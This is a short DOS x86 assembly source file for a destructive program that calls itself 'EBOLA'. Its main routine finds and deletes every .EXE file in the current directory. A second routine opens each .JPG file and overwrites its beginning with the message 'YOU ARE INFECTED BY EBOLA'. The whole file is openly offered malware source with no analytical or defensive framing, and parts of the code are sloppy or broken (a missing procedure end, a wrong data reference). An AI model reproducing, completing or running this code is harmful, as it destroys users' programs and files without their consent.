.MODEL SMALL

.STACK 100H

.DATA  

FILE DB "*.EXE", 0  
FILE1 DB "*.JPG", 0 
DTA DB 128H DUP(?)
DTA1 DB 128H DUP(?)   
FILENAME DB 50 DUP(?)
TEXT DB "YOU ARE INFECTED BY EBOLA"
TEXT_SIZE=$-OFFSET TEXT 
HANDLE DW ?

.CODE

MAIN PROC 
    MOV AX,@DATA
    MOV DS,AX
    
    MOV DX,OFFSET DTA
    MOV AH,1AH
    INT 21H
    
    MOV DX,OFFSET FILE 
    MOV CX,0
    MOV AH,4EH
    INT 21H
    JC NEXT_
    
OUTER_LOOP:
            
     
    
    
    
    
    ;DELETE 
    DELETE:
    LEA DX,DTA+1EH
    MOV AH,41H
    INT 21H
    
    MOV DX,OFFSET FILE 
    MOV CX,0
    MOV AH,4FH
    INT 21H 
    
    
        
    JC NEXT_
    
    JMP OUTER_LOOP
    
    NEXT_:
        CALL FUN1
        
    

    MOV AH,4CH
    INT 21H
    
MAIN ENDP  


FUN1 PROC
    
    MOV AX,@DATA
    MOV DS,AX
    
    MOV DX,OFFSET DTA1
    MOV AH,1AH
    INT 21H 
    
    
    MOV DX,OFFSET FILE1 
    MOV CX,0
    MOV AH,4EH
    INT 21H
    JC QUIT
    
     
    
    OUTER_LOOP1:
        
    ;OPEN FILE 
    MOV DX,OFFSET DTA1+1EH
    MOV AH,3DH
    MOV AL,2
    INT 21H
    MOV HANDLE,AX
    
    ;WRITE FILE
    MOV AH,40H
    MOV BX,HANDLE
    MOV DX,DATA
    MOV CX,TEXT_SIZE
    INT 21H
    
    ;CLOSE FILE
    MOV AH,3EH
    MOV BX,HANDLE
    INT 21H   
            
    
    
    MOV DX,OFFSET FILE1 
    MOV CX,0
    MOV AH,4FH
    INT 21H 
    
    
        
    JC QUIT 
    
   
    
    JMP OUTER_LOOP1 
    
    QUIT:
        RET
    

    END MAIN